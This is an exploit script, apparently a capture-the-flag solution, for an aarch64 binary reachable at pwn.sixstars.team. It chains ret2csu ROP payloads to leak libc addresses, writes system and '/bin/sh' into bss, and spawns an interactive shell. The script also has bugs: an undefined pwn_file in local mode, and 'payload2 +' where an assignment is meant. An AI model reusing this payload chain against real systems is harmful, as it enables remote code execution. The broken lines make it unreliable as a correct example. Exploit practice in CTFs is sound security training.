#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2019 vam <jpwan21@gmail.com>

from pwn import *
context.log_level="debug"
context.arch = "aarch64"
#pwn_file="./"
#elf=ELF(pwn_file)
libc=ELF("./libc-2.23.so")
#heap_add=0
#stack_add=0
if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("pwn.sixstars.team", 23612)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()

csu_start = 0x400864
csu_func = 0x400844
wrapper = 0x400750
puts_got = 0x411020
libc_start_main_got = 0x411008
ldp_ret = 0x400870
bss  = 0x411000
read_got = 0x411028
main = 0x400790

def getcsu_arm(pre_addr, loop_addr, rbx,rbp, func_addr,rdx,rsi, rdi, ret_addr):
    csu = p64(pre_addr) + p64(rbx) + p64(rbp) + p64(func_addr) + p64(rdx) + p64(rsi) + p64(rdi) + p64(loop_addr)\
    + p64(0) + p64(ret_addr) + p64(0)*6
    return csu

csu0 = getcsu_arm(csu_start, csu_func, 0, 1, puts_got,0,0,libc_start_main_got, main)
payload0 = 'a'*0x18 + csu0
# payload0 = 'a'*0x18 + p64(csu_start)
# payload0+= p64(0)+p64(csu_func) + p64(0) + p64(1) + p64(puts_got)+p64(0)+p64(0)+p64(libc_start_main_got)
# payload0+= p64(0) + p64(main)  + p64(0)*6

r.recvuntil("Give me your rop chain: ")
r.sendline(payload0)
r.recvline()
w = r.recv(3)
w = u64(w+'\x00'*5)
low = w - libc.sym['__libc_start_main']
print hex(low)

csu = getcsu_arm(csu_start, csu_func, 0, 1, puts_got,0,0,libc_start_main_got+4, main)
payload = 'a'*0x18 + csu
# payload = 'a'*0x18 + p64(csu_start)
# payload+= p64(0)+p64(csu_func)+ p64(0) + p64(1) + p64(puts_got)+p64(0)+p64(0)+p64(libc_start_main_got+4)
# payload+= p64(0) + p64(main)  + p64(0)*6

r.recvuntil("Give me your rop chain: ")
r.sendline(payload)
r.recvline()

w = r.recv(1)
w = u64(w+'\x00'*7)
high = w

libc.address = high*0x100000000 + low
#libc.address = 0x400082d000 
print "libc.address is: "
print hex(libc.address)
system = libc.sym['system']
binsh = list(libc.search('/bin/sh'))[0]

print hex(system)
print hex(binsh)


csu2 =getcsu_arm(csu_start, csu_func, 0, 1, read_got,100,bss,0, main)
payload2 + 'a'*0x18 + csu2
# payload2 = 'a'*0x18 + p64(csu_start)
# payload2+= p64(0)+p64(csu_func)+ p64(0) + p64(1) + p64(read_got)+p64(100)+p64(bss)+p64(0)
# payload2+= p64(0) + p64(main)  + p64(0)*6
r.recvuntil("Give me your rop chain: ")
r.sendline(payload2)
r.sendline(p64(system)+"/bin/sh\x00")


csu3 = getcsu_arm(csu_start, csu_func, 0, 1, bss, 0, 0, bss+8, main)
payload3 = 'a'*0x18 + csu3
# payload3 = 'a'*0x18 + p64(csu_start)
# payload3+= p64(0)+p64(csu_func)+ p64(0) + p64(1) + p64(bss)+p64(0)+p64(0)+p64(bss+8)
# payload3+= p64(0) + p64(main)  + p64(0)*6
r.recvuntil("Give me your rop chain: ")
r.sendline(payload3)

r.interactive()
